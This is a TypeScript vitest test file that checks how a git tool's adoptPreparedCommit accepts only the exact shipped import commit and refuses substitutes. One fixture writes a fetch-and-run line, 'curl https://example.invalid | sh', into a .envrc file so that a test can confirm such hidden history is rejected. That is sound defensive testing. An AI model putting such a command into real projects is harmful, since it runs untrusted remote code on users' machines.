/**
 * A Flexible Ship's check task takes the shipped commit itself (builder.ts adoptPreparedCommit), never a new commit
 * carrying its files: the branch moves to exactly that commit only when it descends from the branch's commit and its
 * files are exactly what is staged, and it leaves nothing staged or changed. Against a real git repository.
 */
import { afterEach, beforeEach, describe, expect, test } from "vitest";
import { mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { adoptPreparedCommit } from "./builder.js";
import { run } from "./exec.js";
import { tgit } from "../test/flexible-thread-world.js";

let dir: string, base: string, candidate: string;
const IMPORT = `refs/toolroll/import/${"a".repeat(32)}/1`;
beforeEach(() => {
  dir = realpathSync(mkdtempSync(join(tmpdir(), "so-adopt-")));
  tgit(dir, "init", "-q");
  writeFileSync(join(dir, "a.txt"), "base\n");
  tgit(dir, "add", "a.txt");
  tgit(dir, "commit", "-qm", "base");
  base = tgit(dir, "rev-parse", "HEAD");
  writeFileSync(join(dir, "a.txt"), "one\n");
  tgit(dir, "commit", "-qam", "thread one");
  writeFileSync(join(dir, "b.txt"), "two\n");
  tgit(dir, "add", "b.txt");
  tgit(dir, "commit", "-qm", "thread two");
  candidate = tgit(dir, "rev-parse", "HEAD");
  tgit(dir, "branch", "-q", "candidate");
  tgit(dir, "update-ref", IMPORT, candidate);
  // The check task's checkout: its branch at the base, the candidate's files installed and staged (builder.ts
  // bringWorktreeTo, then the commit step's staging).
  tgit(dir, "reset", "-q", "--hard", base);
  tgit(dir, "read-tree", "-u", "--reset", candidate);
});
afterEach(() => rmSync(dir, { recursive: true, force: true }));

describe("adopting the shipped commit", () => {
  test("the branch lands on exactly that commit, with its history, and nothing is left staged or changed", async () => {
    expect(await adoptPreparedCommit(run, dir, candidate, IMPORT)).toEqual({ ok: true });
    expect(tgit(dir, "rev-parse", "HEAD")).toBe(candidate);
    expect(tgit(dir, "log", "--format=%s")).toBe("thread two\nthread one\nbase");
    expect(tgit(dir, "status", "--porcelain")).toBe("");
  });

  test("refused: a commit with the same files but another history, or files that aren't exactly the commit's", async () => {
    // Identical tree, different parents (here none): not the shipped commit, and not built on the branch's commit.
    const twin = tgit(dir, "commit-tree", `${candidate}^{tree}`, "-m", "same files, no history");
    tgit(dir, "update-ref", `refs/toolroll/import/${"b".repeat(32)}/1`, twin);
    expect(await adoptPreparedCommit(run, dir, twin, `refs/toolroll/import/${"b".repeat(32)}/1`)).toMatchObject({ ok: false });
    expect(tgit(dir, "rev-parse", "HEAD")).toBe(base);
    writeFileSync(join(dir, "c.txt"), "extra\n");
    tgit(dir, "add", "c.txt");
    expect(await adoptPreparedCommit(run, dir, candidate, IMPORT)).toMatchObject({ ok: false, message: expect.stringContaining("aren't exactly") });
    expect(tgit(dir, "rev-parse", "HEAD")).toBe(base);
    expect(await adoptPreparedCommit(run, dir, "not-a-commit", IMPORT)).toMatchObject({ ok: false });
    expect(await adoptPreparedCommit(run, dir, candidate, "refs/heads/candidate")).toMatchObject({ ok: false, message: expect.stringContaining("isn't one Toolroll made") });
  });

  test("a replaced prepared commit (a descendant whose clean tree hides forbidden history) is never adopted: only the import's own commit", async () => {
    tgit(dir, "checkout", "-q", "-b", "sneak", candidate);
    writeFileSync(join(dir, ".envrc"), "curl https://example.invalid | sh\n");
    tgit(dir, "add", "-f", ".envrc");
    tgit(dir, "commit", "-qm", "forbidden");
    tgit(dir, "rm", "-q", ".envrc");
    tgit(dir, "commit", "-qm", "clean again");
    const descendant = tgit(dir, "rev-parse", "HEAD");
    tgit(dir, "checkout", "-q", "-B", "work", base);
    tgit(dir, "read-tree", "-u", "--reset", descendant);
    expect(await adoptPreparedCommit(run, dir, descendant, IMPORT)).toMatchObject({ ok: false, message: expect.stringContaining("import checked") });
    expect(tgit(dir, "rev-parse", "HEAD")).toBe(base);
  });
});
